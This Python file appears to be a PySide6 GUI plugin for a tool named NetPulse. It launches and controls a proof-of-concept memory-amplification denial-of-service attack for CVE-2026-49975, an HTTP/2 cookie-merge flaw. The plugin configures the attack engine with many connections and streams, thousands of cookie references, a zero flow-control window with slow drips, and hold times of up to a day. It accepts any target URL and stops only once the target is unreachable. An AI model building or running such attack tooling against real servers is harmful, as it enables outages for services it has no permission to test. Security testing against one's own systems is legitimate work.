# -*- coding: utf-8 -*-
"""NetPulse UI plugin for the CVE-2026-49975 HTTP/2 PoC.

The plugin performs an HTTP/2 probe first.  Only after the probe succeeds does
it start the PoC workers.  A 30 second liveness probe keeps the run bounded:
when the endpoint stops answering, all attack sockets are closed.
"""
from __future__ import annotations

import importlib.util
import threading
import time
from pathlib import Path
from urllib.parse import urlsplit

from PySide6.QtCore import QObject, Signal


def _tr(zh: str, en: str) -> str:
    """Resolve plugin status text using the host application's language."""
    from app.ui.i18n import L
    return L(zh, en)


def _load_engine():
    path = Path(__file__).with_name("_poc.py")
    spec = importlib.util.spec_from_file_location("netpulse_cve_2026_49975_engine", path)
    if spec is None or spec.loader is None:
        raise ImportError(f"cannot load {path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


_engine = _load_engine()


class _Signals(QObject):
    status = Signal(str)
    finished = Signal()


def _parse_target(raw: str):
    value = raw.strip()
    if "://" not in value:
        value = "http://" + value
    parsed = urlsplit(value)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError(_tr("目标必须是 http:// 或 https:// URL",
                             "Target must be an http:// or https:// URL"))
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    return parsed.hostname, port, parsed.scheme == "https", path


class _RunController:
    """Owns the detection, PoC engine and 30 second watchdog."""

    def __init__(self, emit, on_finished):
        self.emit = emit
        self.on_finished = on_finished
        self.stop_event = threading.Event()
        self.thread = None
        self.engine = None
        self._expected_connections = 0
        self._terminal_connections = set()
        self._state_lock = threading.Lock()
        self._stop_scheduled = False

    def start(self, config):
        self.stop_event.clear()
        self.thread = threading.Thread(target=self._run, args=(config,), daemon=True)
        self.thread.start()

    def _run(self, config):
        try:
            host, port, tls, path = config["host"], config["port"], config["tls"], config["path"]
            self.emit(_tr(f"检测 HTTP/2：{host}:{port} …",
                          f"Checking HTTP/2: {host}:{port} …"))
            if self.stop_event.is_set():
                return
            if not _engine.probe_http2(host, port, tls, timeout=5.0):
                self.emit(_tr("未检测到可用的 HTTP/2 PING 响应，已停止",
                              "No usable HTTP/2 PING response was detected; stopped"))
                return
            self.emit(_tr("HTTP/2 检测通过，开始 PoC …", "HTTP/2 check passed; starting PoC …"))
            self._expected_connections = config["connections"]
            self.engine = _engine.AttackEngine(
                host=host,
                port=port,
                tls=tls,
                path=path,
                connections=config["connections"],
                streams=config["streams"],
                refs=config["refs"],
                hold=config["hold"],
                initial_window=config["initial_window"],
                drip_interval=config["drip_interval"],
                drip_bytes=config["drip_bytes"],
                on_event=self._on_engine_event,
            )
            self.engine.start()
            interval = 30.0
            while not self.stop_event.wait(interval):
                self.emit(_tr("30 秒探活：发送 HTTP/2 PING …",
                              "30-second liveness check: sending HTTP/2 PING …"))
                if not _engine.probe_http2(host, port, tls, timeout=5.0):
                    self.emit(_tr("探活失败，目标不可用，已停止 PoC",
                                  "Liveness check failed; target unavailable, stopped PoC"))
                    self.stop()
                    return
                self.emit(_tr("探活通过，继续保持 PoC", "Liveness check passed; PoC is still running"))
                if (self.engine is None or self.engine.stop_event.is_set()
                        or not self.engine.is_alive()):
                    self.emit(_tr("PoC 已完成", "PoC completed"))
                    self.stop()
                    return
        finally:
            self.on_finished()

    def _on_engine_event(self, event):
        kind = event.get("kind")
        if kind == "started":
            self.emit(_tr(
                "已启动：连接={}，流={}，refs={}，payload={}B".format(
                    event["connections"], event["streams"], event["refs"], event["payload_bytes"]),
                "Started: connections={}, streams={}, refs={}, payload={}B".format(
                    event["connections"], event["streams"], event["refs"], event["payload_bytes"])))
        elif kind == "connection":
            state = event.get("state")
            if state == "failed":
                self.emit(_tr(f"连接 {event['id']} 失败：{event.get('error', '')}",
                              f"Connection {event['id']} failed: {event.get('error', '')}"))
            else:
                self.emit(_tr(f"连接 {event['id']}：{state}",
                              f"Connection {event['id']}: {state}"))
            if state in ("failed", "peer_closed", "finished"):
                with self._state_lock:
                    self._terminal_connections.add(event["id"])
                    should_stop = (
                        self._expected_connections > 0
                        and len(self._terminal_connections) >= self._expected_connections
                        and not self._stop_scheduled
                    )
                    if should_stop:
                        self._stop_scheduled = True
                if should_stop:
                    self.emit(_tr("所有 PoC 连接都已关闭，停止运行",
                                  "All PoC connections are closed; stopping"))
                    threading.Thread(target=self.stop, daemon=True).start()

    def stop(self):
        self.stop_event.set()
        if self.engine is not None:
            self.engine.stop()
            self.engine = None
        if self.thread is not None and self.thread is not threading.current_thread():
            self.thread.join(timeout=2.0)
        self.emit(_tr("已停止", "Stopped"))


class Plugin(NetPulsePlugin):
    name = ("CVE-2026-49975 HTTP/2 PoC", "CVE-2026-49975 HTTP/2 PoC")
    title = name
    version = "1.0"
    author = "NetPulse"
    icon = "WARNING"
    category = "tool"
    description = (
        "HTTP/2 Cookie 合并内存放大 PoC；先探测协议，每 30 秒探活并在失活时停止",
        "HTTP/2 Cookie merge memory-amplification PoC with protocol detection and a 30s watchdog",
    )

    def on_load(self, ctx):
        self._ctx = ctx
        self._controller = None
        self._signals = _Signals()

    def create_widget(self, parent):
        from PySide6.QtWidgets import (QFormLayout, QHBoxLayout, QLabel, QLineEdit,
                                        QPlainTextEdit, QPushButton, QSpinBox,
                                        QDoubleSpinBox, QVBoxLayout, QWidget)

        widget = QWidget(parent)
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(28, 22, 28, 22)
        form = QFormLayout()
        self._target = QLineEdit(self._ctx.get("target", "http://127.0.0.1:10081"))
        self._target.setPlaceholderText(_tr("http://host:port 或 https://host:port",
                                           "http://host:port or https://host:port"))
        form.addRow(QLabel(_tr("目标", "Target")), self._target)
        self._connections = self._spin(form, _tr("连接数", "Connections"), 1, 32, 1)
        self._streams = self._spin(form, _tr("每连接流数", "Streams per connection"), 1, 500, 30)
        self._refs = self._spin(form, "Cookie refs", 1, 4091, 4091)
        self._hold = QDoubleSpinBox()
        self._hold.setRange(1.0, 86400.0)
        self._hold.setValue(300.0)
        self._hold.setSuffix(" s")
        form.addRow(QLabel(_tr("保持时间", "Hold time")), self._hold)
        self._drip_interval = QDoubleSpinBox()
        self._drip_interval.setRange(0.0, 60.0)
        self._drip_interval.setValue(2.0)
        self._drip_interval.setSuffix(" s")
        form.addRow(QLabel(_tr("窗口滴灌间隔", "Window drip interval")), self._drip_interval)
        self._drip_bytes = self._spin(form, _tr("每次滴灌字节", "Drip bytes"), 0, 65535, 1)
        layout.addLayout(form)

        buttons = QHBoxLayout()
        self._start = QPushButton(_tr("检测并开始", "Check and start"))
        self._stop = QPushButton(_tr("停止", "Stop"))
        self._stop.setEnabled(False)
        buttons.addWidget(self._start)
        buttons.addWidget(self._stop)
        layout.addLayout(buttons)
        self._status = QLabel(_tr("就绪", "Ready"))
        layout.addWidget(self._status)
        self._log = QPlainTextEdit()
        self._log.setReadOnly(True)
        layout.addWidget(self._log, 1)

        self._signals.status.connect(self._append_status)
        self._signals.finished.connect(self._finished)
        self._start.clicked.connect(self._start_run)
        self._stop.clicked.connect(self._stop_run)
        return widget

    @staticmethod
    def _spin(form, label, minimum, maximum, value):
        from PySide6.QtWidgets import QLabel, QSpinBox
        box = QSpinBox()
        box.setRange(minimum, maximum)
        box.setValue(value)
        form.addRow(QLabel(label), box)
        return box

    def _append_status(self, message):
        stamp = time.strftime("%H:%M:%S")
        self._status.setText(message)
        self._log.appendPlainText(f"[{stamp}] {message}")

    def _start_run(self):
        if self._controller is not None:
            return
        try:
            host, port, tls, path = _parse_target(self._target.text())
        except ValueError as exc:
            self._append_status(str(exc))
            return
        self._ctx.set("target", self._target.text().strip())
        config = {
            "host": host, "port": port, "tls": tls, "path": path,
            "connections": self._connections.value(),
            "streams": self._streams.value(),
            "refs": self._refs.value(),
            "hold": self._hold.value(),
            "initial_window": 0,
            "drip_interval": self._drip_interval.value(),
            "drip_bytes": self._drip_bytes.value(),
        }
        self._controller = _RunController(self._signals.status.emit,
                                           self._signals.finished.emit)
        self._start.setEnabled(False)
        self._stop.setEnabled(True)
        self._controller.start(config)

    def _stop_run(self):
        if self._controller is not None:
            self._controller.stop()
            self._controller = None
        self._finished()

    def _finished(self):
        self._controller = None
        self._start.setEnabled(True)
        self._stop.setEnabled(False)

    def on_unload(self):
        if self._controller is not None:
            self._controller.stop()
            self._controller = None
